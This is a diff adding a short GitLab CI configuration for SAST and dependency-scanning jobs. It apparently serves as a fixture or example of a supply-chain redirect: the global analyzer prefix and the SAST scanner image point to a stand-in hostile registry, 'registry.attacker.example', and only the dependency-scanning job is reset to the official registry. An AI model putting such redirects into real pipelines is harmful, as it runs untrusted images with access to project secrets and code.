@@ -1,0 +1,19 @@
+stages:
+  - test
+
+variables:
+  SECURE_ANALYZERS_PREFIX: registry.attacker.example/analyzers
+
+sast:
+  stage: test
+  variables:
+    CS_ANALYZER_IMAGE: registry.attacker.example/container-scanning:7
+  script:
+    - /analyzer run
+
+dependency_scanning:
+  stage: test
+  variables:
+    SECURE_ANALYZERS_PREFIX: registry.gitlab.com/security-products
+  script:
+    - /analyzer run
